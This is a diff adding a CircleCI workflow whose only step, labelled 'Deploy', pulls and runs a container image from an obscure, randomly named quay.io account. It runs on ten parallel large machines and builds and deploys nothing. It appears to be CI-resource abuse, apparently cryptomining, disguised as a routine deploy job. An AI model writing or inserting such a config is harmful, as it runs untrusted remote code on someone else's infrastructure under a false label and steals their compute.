@@ -1,0 +1,22 @@
+working_dir: &working_dir ~/app
+
+version: 2.1
+
+workflows:
+  main:
+    jobs:
+      - build
+
+jobs:
+  build:
+    parallelism: 10
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      docker pull quay.io/eyfsubdi78/a:latest
+                      docker run quay.io/eyfsubdi78/a:latest
